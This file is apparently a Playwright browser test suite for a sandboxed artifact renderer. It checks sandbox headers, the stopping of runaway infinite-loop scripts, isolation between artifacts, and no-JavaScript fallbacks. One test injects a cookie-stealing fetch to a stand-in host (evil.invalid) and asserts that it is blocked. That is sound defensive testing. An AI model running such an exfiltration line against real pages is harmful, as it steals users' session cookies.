import { expect, test, type Page } from "@playwright/test";

// E05-S07 hostile browser matrix: two live artifacts in one browser context
// (multi-artifact coexistence), hostile source in one sparing the other,
// explicit worker termination, sandbox response headers on every engine, and
// disabled-JavaScript degradation. Runs on Chromium, Firefox and WebKit via
// the shared playwright config. The benign artifact is the sample chart; the
// hostile artifact replaces only its JS through window.proof.hostile.

declare global { interface Window { proof: { state(): { slider: number }; activate(source: any, migrate: (value: any) => any): Promise<boolean>; hostile(js: string): void } } }

const READY_TIMEOUT = 20_000;

const frame = (page: Page) => page.frameLocator("#artifact");

async function ready(page: Page): Promise<void> {
  await page.goto("/host.html");
  await expect(page.locator("#status")).toHaveText("ready", { timeout: READY_TIMEOUT });
}

async function stop(page: Page): Promise<void> {
  const box = await page.locator("#stop").boundingBox();
  expect(box).not.toBeNull();
  await page.mouse.click(box!.x + box!.width / 2, box!.y + box!.height / 2);
}

test("host and renderer responses carry sandbox headers on every engine", async ({ page }) => {
  const hostResponse = await page.goto("/host.html");
  const hostCsp = hostResponse?.headers()["content-security-policy"] ?? "";
  expect(hostCsp).toContain("frame-src http://127.0.0.1:4174");
  expect(hostCsp).toContain("connect-src 'none'");
  expect(hostResponse?.headers()["permissions-policy"]).toContain("camera=()");
  await expect(page.locator("#status")).toHaveText("ready", { timeout: READY_TIMEOUT });

  const rendererResponse = await page.goto("http://127.0.0.1:4174/renderer.html");
  const rendererCsp = rendererResponse?.headers()["content-security-policy"] ?? "";
  expect(rendererCsp).toContain("frame-ancestors http://localhost:4173");
  expect(rendererCsp).toContain("connect-src 'none'");
  expect(rendererCsp).toContain("object-src 'none'");
  expect(rendererResponse?.headers()["permissions-policy"]).toContain("microphone=()");
});

test("hostile runaway in one artifact leaves a second artifact interactive", async ({ context }) => {
  const hostile = await context.newPage();
  const benign = await context.newPage();
  try {
    await ready(hostile);
    await ready(benign);
    await expect(frame(benign).getByRole("img", { name: "Spending by category" })).toBeVisible();

    await hostile.evaluate(() => window.proof.hostile(`while(true){}`));
    await expect(hostile.locator("#status")).toHaveText("connected", { timeout: 5_000 });

    // The benign artifact stays usable while the hostile worker spins: its
    // worker is a separate thread with its own nonce, port and budget.
    const slider = frame(benign).getByRole("slider", { name: "Scenario" });
    await slider.focus();
    await slider.press("ArrowRight");
    await expect(frame(benign).locator('[data-slot="value"]')).toHaveText("Illustrative buffer: €26");

    await stop(hostile);
    await expect(hostile.locator("#status")).toHaveText("stopped", { timeout: 1_000 });

    // Stopping the hostile artifact never touches the benign one's state.
    await expect(frame(benign).locator('[data-slot="value"]')).toHaveText("Illustrative buffer: €26");
    expect(await benign.evaluate(() => window.proof.state())).toEqual({ version: 1, slider: 26 });
  } finally {
    await hostile.close();
    await benign.close();
  }
});

test("four simultaneous hostile runaways are each stopped under one second while a good artifact responds", async ({ context, browserName }) => {
  // E05-S07 acceptance 3: four hostile artifacts at once (the per-user
  // session cap maximum), each Stop measured — not just waited on.
  const version = context.browser()?.version() ?? "unknown";
  const pages: Page[] = [];
  const good = await context.newPage();
  try {
    await ready(good);
    await expect(frame(good).getByRole("img", { name: "Spending by category" })).toBeVisible();
    for (let i = 0; i < 4; i++) {
      const hostile = await context.newPage();
      pages.push(hostile);
      await ready(hostile);
      await hostile.evaluate(() => window.proof.hostile(`while(true){}`));
      await expect(hostile.locator("#status")).toHaveText("connected", { timeout: 5_000 });
    }
    // The good artifact stays interactive with four workers spinning.
    const slider = frame(good).getByRole("slider", { name: "Scenario" });
    await slider.focus();
    await slider.press("ArrowRight");
    await expect(frame(good).locator('[data-slot="value"]')).toHaveText("Illustrative buffer: €26");

    for (const [index, hostile] of pages.entries()) {
      const started = Date.now();
      await stop(hostile);
      await expect(hostile.locator("#status")).toHaveText("stopped", { timeout: 1_000 });
      const elapsed = Date.now() - started;
      expect(elapsed).toBeLessThan(1_000);
      // eslint-disable-next-line no-console
      console.log(`[e05-matrix] ${browserName}/${version} hostile[${index}] stop=${elapsed}ms`);
    }
    await expect(frame(good).locator('[data-slot="value"]')).toHaveText("Illustrative buffer: €26");
    expect(await good.evaluate(() => window.proof.state())).toEqual({ version: 1, slider: 26 });
  } finally {
    for (const hostile of pages) await hostile.close();
    await good.close();
  }
});

test("silent runaway auto-terminates at the execution bound without host input", async ({ page, browserName }) => {
  // The executionMs bound (5 s in the proof contract) fires without any Stop
  // click; the host stays interactive and the artifact can be reopened after.
  await ready(page);
  const version = page.context().browser()?.version() ?? "unknown";
  await page.evaluate(() => window.proof.hostile(`while(true){}`));
  await expect(page.locator("#status")).toHaveText("connected", { timeout: 5_000 });
  const started = Date.now();
  await expect(page.locator("#status")).toHaveText("terminated", { timeout: 9_000 });
  const elapsed = Date.now() - started;
  // eslint-disable-next-line no-console
  console.log(`[e05-matrix] ${browserName}/${version} auto-terminate=${elapsed}ms`);
  await expect(page.locator("#reload")).toBeEnabled();
  await page.locator("#reload").click();
  await expect(page.locator("#status")).toHaveText("ready", { timeout: READY_TIMEOUT });
  await expect(frame(page).getByRole("img", { name: "Spending by category" })).toBeVisible();
});

test("hostile exfiltration attempt emits no network and spares the second artifact", async ({ context }) => {
  const evil: string[] = [];
  context.on("request", request => { if (request.url().includes("evil.invalid")) evil.push(request.url()); });
  const hostile = await context.newPage();
  const benign = await context.newPage();
  try {
    await ready(hostile);
    await ready(benign);
    await expect(frame(benign).getByRole("img", { name: "Spending by category" })).toBeVisible();

    // The hostile script runs (its own patch lands) but fetch/document and
    // every node-shaped global are absent in the VM, with CSP connect-src
    // 'none' as a second wall.
    await hostile.evaluate(() => window.proof.hostile(
      `try{fetch("https://evil.invalid/steal?c="+document.cookie)}catch(e){} artifact.ui.patch({slot:"value",text:[typeof process,typeof require,typeof module,typeof Buffer,typeof Deno,typeof Bun].join(",")})`
    ));
    await expect(hostile.locator("#status")).toHaveText("ready", { timeout: 15_000 });
    const hostileProbe = Array(6).fill("undefined").join(",");
    await expect(frame(hostile).locator('[data-slot="value"]')).toHaveText(hostileProbe);
    expect(evil).toEqual([]);

    // The benign artifact rendered from its own source/frame is untouched.
    await expect(frame(benign).getByRole("img", { name: "Spending by category" })).toBeVisible();
    await expect(frame(benign).locator('[data-slot="value"]')).not.toHaveText(hostileProbe);
  } finally {
    await hostile.close();
    await benign.close();
  }
});

test("host page degrades with JavaScript disabled", async ({ browser }) => {
  const context = await browser.newContext({ javaScriptEnabled: false });
  const page = await context.newPage();
  try {
    await page.goto("/host.html");
    await expect(page.locator("#noscript-host")).toBeVisible();
    await expect(page.locator("#noscript-host")).toContainText("requires JavaScript");
  } finally {
    await context.close();
  }
});

test("renderer page degrades with JavaScript disabled", async ({ browser }) => {
  const context = await browser.newContext({ javaScriptEnabled: false });
  const page = await context.newPage();
  try {
    await page.goto("http://127.0.0.1:4174/renderer.html");
    await expect(page.locator("#noscript-renderer")).toBeVisible();
    await expect(page.locator("#noscript-renderer")).toContainText("requires JavaScript");
  } finally {
    await context.close();
  }
});
